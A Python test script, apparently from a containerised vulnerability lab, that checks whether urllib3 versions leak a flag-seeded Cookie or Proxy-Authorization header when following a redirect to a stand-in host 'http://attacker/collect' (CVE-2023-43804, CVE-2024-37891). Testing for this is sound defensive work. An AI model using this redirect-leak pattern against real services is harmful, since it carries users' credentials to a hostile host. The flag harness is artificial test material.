#!/usr/bin/env python3
"""Client under test: urllib3 (pinned per compose profile) follows a cross-ORIGIN 302 while
carrying a sensitive header seeded with ${PCB_FLAG}. Prints the attacker collector's echo of
the headers it actually received. If ${PCB_FLAG} appears there, the header was NOT stripped.

  seed     (CVE-2023-43804): flag in the Cookie header.
                             leaks on V0 (1.26.16), stripped on V1 (1.26.17).
  residual (CVE-2024-37891): flag in the Proxy-Authorization header.
                             leaks on V0 AND V1, stripped on V2 (1.26.19).

The client fetches http://redirector/redir; redirector answers 302 -> http://attacker/collect
(DIFFERENT host => genuine cross-origin => urllib3 applies remove_headers_on_redirect).
"""
import os
import sys

import urllib3

FLAG = os.environ.get("PCB_FLAG", "NO_FLAG")
which = sys.argv[1] if len(sys.argv) > 1 else "residual"

if which == "seed":
    label = "SEED"
    headers = {"Cookie": "session=" + FLAG}
else:
    label = "RESIDUAL"
    headers = {"Proxy-Authorization": "Basic " + FLAG}

http = urllib3.PoolManager()
try:
    resp = http.request("GET", "http://redirector/redir", headers=headers, redirect=True)
    body = resp.data.decode("utf-8", "replace")
    print("%s_VERSION: %s" % (label, urllib3.__version__))
    print("%s_STATUS: %s" % (label, resp.status))
    print("%s_FINAL_HEADERS: %s" % (label, body))
    print("%s_FLAG_LEAKED: %s" % (label, FLAG in body))
except Exception as e:  # noqa: BLE001
    print("%s_ERROR: %s" % (label, e))
